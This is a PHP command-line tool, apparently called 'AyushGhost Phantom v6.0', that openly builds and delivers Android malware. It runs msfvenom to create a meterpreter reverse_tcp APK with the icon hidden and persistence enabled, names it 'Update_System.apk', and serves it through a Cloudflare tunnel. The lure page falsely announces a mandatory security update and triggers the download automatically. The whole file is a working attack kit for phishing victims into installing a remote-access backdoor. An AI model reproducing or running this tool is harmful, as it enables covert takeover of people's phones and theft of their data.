#!/usr/bin/env php
<?php
/*
 * -----------------------------------------------------------------
 * AYUSHGHOST CORE - PHANTOM v6.0 (PRO UI EDITION)
 * -----------------------------------------------------------------
 */

error_reporting(0);
set_time_limit(0);

class AyushGhost {
    // Color Palette
    private $r = "\e[1;31m"; private $g = "\e[1;32m"; private $y = "\e[1;33m";
    private $b = "\e[1;34m"; private $p = "\e[1;35m"; private $c = "\e[1;36m"; 
    private $w = "\e[1;37m"; private $z = "\e[0m";

    public function __construct() {
        $this->setup();
        $this->header();
    }

    private function setup() {
        if (!is_dir("pub")) mkdir("pub", 0777, true);
        shell_exec("pkill -f 'php -S'");
        shell_exec("pkill -f 'cloudflared'");
    }

    private function header() {
        system("clear");
        echo "{$this->c}
     █████╗ ██╗   ██╗██╗   ██╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
    ██╔══██╗╚██╗ ██╔╝██║   ██║██╔════╝██║  ██║██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    ███████║ ╚████╔╝ ██║   ██║███████╗███████║██║  ███╗███████║██║   ██║███████╗   ██║   
    ██╔══██║  ╚██╔╝  ██║   ██║╚════██║██╔══██║██║   ██║██╔══██║██║   ██║╚════██║   ██║   
    ██║  ██║   ██║   ╚██████╔╝███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
    {$this->z}
    {$this->b}  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    {$this->b}  ┃ {$this->w}Author  : {$this->g}AYUSHGHOST {$this->b}            ┃ {$this->w}Version : {$this->y}6.0 PRO UI {$this->b}      ┃
    {$this->b}  ┃ {$this->w}Feature : {$this->p}Auto-Download Link {$this->b}    ┃ {$this->w}Status  : {$this->g}Stable     {$this->b}      ┃
    {$this->b}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{$this->z}\n";
    }

    public function deploy() {
        echo "\n{$this->y} [!] Initializing Services...{$this->z}\n";
        echo "{$this->c} ├── {$this->w}Local Server  : ";
        shell_exec("php -S 127.0.0.1:8080 -t pub > /dev/null 2>&1 &");
        echo "{$this->g}[RUNNING]{$this->z}\n";

        echo "{$this->c} └── {$this->w}Tunnel Service: ";
        @unlink("cf.log");
        shell_exec("cloudflared tunnel --url http://127.0.0.1:8080 > cf.log 2>&1 &");
        
        $link = "";
        for($i=0; $i<15; $i++) {
            if(file_exists("cf.log")) {
                $log = file_get_contents("cf.log");
                if (preg_match('/https:\/\/[a-z0-9-]+\.trycloudflare\.com/', $log, $matches)) {
                    $link = $matches[0]; break;
                }
            }
            sleep(1); echo "{$this->y}.{$this->z}";
        }

        if (!$link) { echo "{$this->r}[FAILED]{$this->z}\n"; return; }
        echo "{$this->g}[ONLINE]{$this->z}\n";

        echo "\n{$this->b} ╭─[ {$this->w}PAYLOAD CONFIGURATION {$this->b}]{$this->z}\n";
        $lhost = readline(" ├── LHOST : ");
        $lport = readline(" └── LPORT : ");

        echo "\n{$this->y} [*] Building Stealth APK...{$this->z} ";
        $cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport ";
        $cmd .= "AndroidEnableStageEncoding=true AndroidHideAppIcon=true AndroidPersistence=true ";
        $cmd .= "-o pub/Update_System.apk > /dev/null 2>&1";
        system($cmd);

        if(file_exists("pub/Update_System.apk")) {
            echo "{$this->g}[DONE]{$this->z}\n";
            
            $html = "<html><head><title>System Update</title><script>
                    function trigger() { var link = document.createElement('a'); link.href = 'Update_System.apk';
                    link.download = 'Update_System.apk'; document.body.appendChild(link); link.click();
                    document.body.removeChild(link); } window.onload = function() { setTimeout(trigger, 1000); };
                    </script></head><body style='background:#1a1a1a;color:white;font-family:Arial;text-align:center;padding-top:100px;'>
                    <h1>⚠️ Security Update Required</h1><p>Downloading mandatory patch...</p>
                    <a href='Update_System.apk' style='color:#0f0;'>Click here if download doesn't start</a>
                    </body></html>";
            
            file_put_contents("pub/index.php", $html);

            echo "\n{$this->g} [+] Successfully Deployed!{$this->z}\n";
            echo "{$this->w} 🔗 URL: {$this->y}$link{$this->z}\n";
            echo "{$this->w} 📂 Path: {$this->c}pub/Update_System.apk{$this->z}\n";
        } else {
            echo "{$this->r}[ERROR] MSFVenom failed.{$this->z}\n";
        }
    }

    public function run() {
        while(true) {
            echo "\n{$this->b} ┏━[ {$this->w}MAIN MENU {$this->b}]{$this->z}\n";
            echo "{$this->b} ┃ {$this->g}[1] {$this->w}Build & Deploy Attack\n";
            echo "{$this->b} ┃ {$this->r}[2] {$this->w}Reset & Cleanup\n";
            echo "{$this->b} ┃ {$this->y}[0] {$this->w}Exit Console\n";
            echo "{$this->b} ┗━━━━━━━━━━━━━━━━━━━━━▶ {$this->z}";
            
            $in = readline();
            if($in == "1") $this->deploy();
            elseif($in == "2") {
                shell_exec("pkill -f php; pkill -f cloudflared; rm -rf pub/*.apk cf.log");
                echo "\n{$this->g} [!] System Cleaned!{$this->z}\n";
            }
            elseif($in == "0") {
                echo "{$this->y} [!] Stopping services... Bye!{$this->z}\n";
                shell_exec("pkill -f php; pkill -f cloudflared");
                exit();
            }
        }
    }
}

$ghost = new AyushGhost();
$ghost->run();
